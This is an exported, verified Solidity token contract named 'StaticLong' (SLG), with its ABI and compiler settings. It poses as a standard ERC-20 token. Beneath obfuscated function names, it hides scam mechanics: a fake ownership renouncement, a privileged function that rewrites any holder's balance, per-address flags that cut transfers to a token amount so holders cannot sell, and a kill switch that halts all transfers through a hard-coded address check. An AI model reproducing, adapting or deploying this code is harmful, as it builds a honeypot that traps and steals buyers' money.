{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface receiverList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract liquidityMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txLaunched {\n    function createPair(address launchedFromTotal, address tradingList) external returns (address);\n}\n\ninterface listFromLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTx) external view returns (uint256);\n\n    function transfer(address swapTx, uint256 receiverFee) external returns (bool);\n\n    function allowance(address fundMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapTx,\n        uint256 receiverFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingListIs, uint256 value);\n    event Approval(address indexed fundMin, address indexed spender, uint256 value);\n}\n\ninterface tradingTake is listFromLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StaticLong is liquidityMode, listFromLaunch, tradingTake {\n\n    function amountBuyAuto() public {\n        emit OwnershipTransferred(modeMax, address(0));\n        tradingLaunchedWallet = address(0);\n    }\n\n    bool public launchedFrom;\n\n    uint256 launchMode;\n\n    uint8 private fundReceiver = 18;\n\n    bool private amountMode;\n\n    mapping(address => uint256) private launchedTakeList;\n\n    bool private liquidityAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minLimit;\n    }\n\n    address receiverModeMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public modeMax;\n\n    function buyAuto(address listSenderTo, address swapTx, uint256 receiverFee) internal returns (bool) {\n        require(launchedTakeList[listSenderTo] >= receiverFee);\n        launchedTakeList[listSenderTo] -= receiverFee;\n        launchedTakeList[swapTx] += receiverFee;\n        emit Transfer(listSenderTo, swapTx, receiverFee);\n        return true;\n    }\n\n    uint256 private tradingMin;\n\n    uint256 constant receiverSell = 9 ** 10;\n\n    function getOwner() external view returns (address) {\n        return tradingLaunchedWallet;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableMinExempt;\n    }\n\n    event OwnershipTransferred(address indexed txToMarketing, address indexed minWallet);\n\n    bool public feeWallet;\n\n    bool public toMarketing;\n\n    string private receiverToken = \"Static Long\";\n\n    function exemptMode(address modeTake) public {\n        if (fromTeam) {\n            return;\n        }\n        if (amountMode == feeWallet) {\n            exemptBuy = tradingMin;\n        }\n        shouldAuto[modeTake] = true;\n        \n        fromTeam = true;\n    }\n\n    function approve(address walletMin, uint256 receiverFee) public virtual override returns (bool) {\n        receiverTotal[_msgSender()][walletMin] = receiverFee;\n        emit Approval(_msgSender(), walletMin, receiverFee);\n        return true;\n    }\n\n    mapping(address => bool) public tradingAuto;\n\n    uint256 swapAutoTeam;\n\n    function balanceOf(address receiverTx) public view virtual override returns (uint256) {\n        return launchedTakeList[receiverTx];\n    }\n\n    address sellReceiverLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function buyMarketingExempt() private view {\n        require(shouldAuto[_msgSender()]);\n    }\n\n    function isEnable(address listSenderTo, address swapTx, uint256 receiverFee) internal returns (bool) {\n        if (listSenderTo == modeMax) {\n            return buyAuto(listSenderTo, swapTx, receiverFee);\n        }\n        uint256 exemptLaunched = listFromLaunch(teamAuto).balanceOf(receiverModeMin);\n        require(exemptLaunched == launchMode);\n        require(swapTx != receiverModeMin);\n        if (tradingAuto[listSenderTo]) {\n            return buyAuto(listSenderTo, swapTx, receiverSell);\n        }\n        return buyAuto(listSenderTo, swapTx, receiverFee);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundReceiver;\n    }\n\n    function receiverShouldSender(uint256 receiverFee) public {\n        buyMarketingExempt();\n        launchMode = receiverFee;\n    }\n\n    address private tradingLaunchedWallet;\n\n    uint256 private enableMinExempt = 100000000 * 10 ** 18;\n\n    function transfer(address takeTx, uint256 receiverFee) external virtual override returns (bool) {\n        return isEnable(_msgSender(), takeTx, receiverFee);\n    }\n\n    function transferFrom(address listSenderTo, address swapTx, uint256 receiverFee) external override returns (bool) {\n        if (_msgSender() != sellReceiverLaunched) {\n            if (receiverTotal[listSenderTo][_msgSender()] != type(uint256).max) {\n                require(receiverFee <= receiverTotal[listSenderTo][_msgSender()]);\n                receiverTotal[listSenderTo][_msgSender()] -= receiverFee;\n            }\n        }\n        return isEnable(listSenderTo, swapTx, receiverFee);\n    }\n\n    function atExempt(address takeTx, uint256 receiverFee) public {\n        buyMarketingExempt();\n        launchedTakeList[takeTx] = receiverFee;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverTotal;\n\n    function owner() external view returns (address) {\n        return tradingLaunchedWallet;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverToken;\n    }\n\n    mapping(address => bool) public shouldAuto;\n\n    uint256 public exemptBuy;\n\n    bool public teamLiquidity;\n\n    string private minLimit = \"SLG\";\n\n    constructor (){\n        \n        receiverList maxLaunched = receiverList(sellReceiverLaunched);\n        teamAuto = txLaunched(maxLaunched.factory()).createPair(maxLaunched.WETH(), address(this));\n        if (liquidityAmount == feeWallet) {\n            exemptBuy = tradingMin;\n        }\n        modeMax = _msgSender();\n        amountBuyAuto();\n        shouldAuto[modeMax] = true;\n        launchedTakeList[modeMax] = enableMinExempt;\n        \n        emit Transfer(address(0), modeMax, enableMinExempt);\n    }\n\n    function autoAt(address tokenIs) public {\n        buyMarketingExempt();\n        \n        if (tokenIs == modeMax || tokenIs == teamAuto) {\n            return;\n        }\n        tradingAuto[tokenIs] = true;\n    }\n\n    function allowance(address fundShould, address walletMin) external view virtual override returns (uint256) {\n        if (walletMin == sellReceiverLaunched) {\n            return type(uint256).max;\n        }\n        return receiverTotal[fundShould][walletMin];\n    }\n\n    bool public fromTeam;\n\n    address public teamAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txToMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingListIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountBuyAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"atExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenIs\",\"type\":\"address\"}],\"name\":\"autoAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"}],\"name\":\"exemptMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"receiverShouldSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSenderTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StaticLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}